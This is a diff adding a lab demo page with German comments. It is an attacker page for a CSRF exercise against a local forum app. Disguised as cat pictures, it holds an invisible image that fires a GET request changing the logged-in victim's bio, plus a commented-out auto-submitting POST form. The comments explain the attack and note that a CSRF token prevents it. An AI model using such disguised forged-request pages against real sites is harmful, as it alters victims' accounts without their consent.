@@ -1,0 +1,28 @@
+<!doctype html>
+<!--
+  ANGREIFER-SEITE für die CSRF-Demo. Nur lokal im Lab.
+  Diese Datei einfach im Browser öffnen (file://) oder per zweitem Mini-Server
+  ausliefern, WÄHREND man im Cowboy-Forum (127.0.0.1:5000) eingeloggt ist.
+
+  Das <img> feuert einen GET auf /set-bio. Der Browser hängt automatisch den
+  Session-Cookie des Opfers an -> die Bio wird ohne Zutun des Opfers geändert.
+  Genau das verhindert der CSRF-Token beim POST-Formular (/profile).
+-->
+<html lang="de">
+<head><meta charset="utf-8"><title>Süße Katzenbilder 🐱</title></head>
+<body>
+  <h1>Nur ein paar harmlose Katzenbilder…</h1>
+  <p>(im Hintergrund läuft der CSRF-Angriff)</p>
+
+  <!-- Variante A: unsichtbares Bild -> stiller GET-Request -->
+  <img src="http://127.0.0.1:5000/set-bio?bio=CSRF%20war%20hier%20%F0%9F%A4%A0"
+       width="1" height="1" alt="">
+
+  <!-- Variante B (auskommentiert): Auto-Post gegen eine POST-Route OHNE Token
+  <form id="f" action="http://127.0.0.1:5000/set-bio" method="POST">
+    <input type="hidden" name="bio" value="pwned">
+  </form>
+  <script>document.getElementById('f').submit()</script>
+  -->
+</body>
+</html>
